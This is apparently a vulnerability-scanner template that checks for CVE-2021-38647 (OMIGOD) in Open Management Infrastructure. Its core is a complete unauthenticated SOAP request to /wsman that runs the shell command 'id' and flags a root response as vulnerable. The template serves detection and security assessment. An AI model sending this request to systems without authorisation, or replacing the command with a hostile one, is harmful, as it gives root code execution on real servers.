cves/2021/CVE-2021-38647.yaml

id: CVE-2021-38647

info:
  name: OMIGOD - Open Management Infrastructure RCE
  author: daffainfo
  description: Unauthenticated RCE vulnerability in the Open Management Infrastructure by removing authentication header
  severity: critical
  tags: cve,cve2021,rce,omi
  reference:
    - https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647
    - https://attackerkb.com/topics/08O94gYdF1/cve-2021-38647
    - https://censys.io/blog/understanding-the-impact-of-omigod-cve-2021-38647/
    - https://github.com/microsoft/omi

requests:

  - raw:
      - |
        POST /wsman HTTP/1.1
        Connection: Keep-Alive
        Content-Length: 1505
        Content-Type: application/soap+xml;charset=UTF-8
        Host: {{Hostname}}

        <s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:h="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema">
           <s:Header>
              <a:To>{{BaseURL}}/wsman/</a:To>
              <w:ResourceURI s:mustUnderstand="true">http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem</w:ResourceURI>
              <a:ReplyTo>
                 <a:Address s:mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>
              </a:ReplyTo>
              <a:Action>http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand</a:Action>
              <w:MaxEnvelopeSize s:mustUnderstand="true">102400</w:MaxEnvelopeSize>
              <a:MessageID>uuid:0AB58087-C2C3-0005-0000-000000010000</a:MessageID>
              <w:OperationTimeout>PT1M30S</w:OperationTimeout>
              <w:Locale xml:lang="en-us" s:mustUnderstand="false" />
              <p:DataLocale xml:lang="en-us" s:mustUnderstand="false" />
              <w:OptionSet s:mustUnderstand="true" />
              <w:SelectorSet>
                 <w:Selector Name="__cimnamespace">root/scx</w:Selector>
              </w:SelectorSet>
           </s:Header>
           <s:Body>
              <p:ExecuteShellCommand_INPUT xmlns:p="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem">
                 <p:command>id</p:command>
                 <p:timeout>0</p:timeout>
              </p:ExecuteShellCommand_INPUT>
           </s:Body>
        </s:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "uid=0(root) gid=0(root) groups=0(root)"
        part: body

      - type: status
        status:
          - 200
